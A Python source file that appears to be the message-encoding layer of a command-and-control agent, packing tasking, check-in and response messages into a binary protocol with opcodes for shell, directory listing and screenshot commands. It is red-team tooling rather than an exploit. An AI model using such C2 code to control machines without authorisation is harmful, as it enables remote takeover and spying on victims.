import json


commands = {
    "get_tasking": {"hex_code": 0x00, "input_type": None},
    "checkin": {"hex_code": 0xf1, "input_type": None},
    "post_response": {"hex_code": 0x01, "input_type": None},
    "shell": {"hex_code": 0x54, "input_type": "string"},
    "cd": {"hex_code": 0x55, "input_type": "string"},
    "ls": {"hex_code": 0x56, "input_type": "string"},
    "pwd": {"hex_code": 0x57, "input_type": None},
    "exit": {"hex_code": 0x58, "input_type": None},
    "screenshot": {"hex_code": 0x59, "input_type": None},
}



def responseTasking(tasks):
    data = b""
    dataTask = b""

    dataHead = commands["get_tasking"]["hex_code"].to_bytes(1,"big") + len(tasks).to_bytes(4, "big")
    
    for task in tasks:
        command_to_run = task["command"]
        
        if commands[command_to_run]["input_type"] == "string":
            data = commands[command_to_run]["hex_code"].to_bytes(1, "big")
            data += task["id"].encode()

            if task["parameters"] != "":
                parameters = json.loads(task["parameters"])
                data += len(parameters).to_bytes(4,"big")
                for param in parameters:
                    data += len(parameters[param]).to_bytes(4, "big")
                    data += parameters[param].encode()
            else:
                data += b"\x00\x00\x00\x00"
            
            dataTask += len(data).to_bytes(4, "big") + data

        elif commands[command_to_run]["input_type"] == "int":
            print("Unsupported type (for now...)")
    
    dataToSend = dataHead + dataTask
    
    return dataToSend


def responseCheckin(uuid):
    data = commands["checkin"]["hex_code"].to_bytes(1, "big") + uuid.encode() + b"\x01"
    return data

def responsePosting(responses):
    data = len(responses).to_bytes(4, "big")
    for response in responses:
        if response["status"] == "success":
            data += b"\x01"
        else: 
            data += b"\x00"

    return data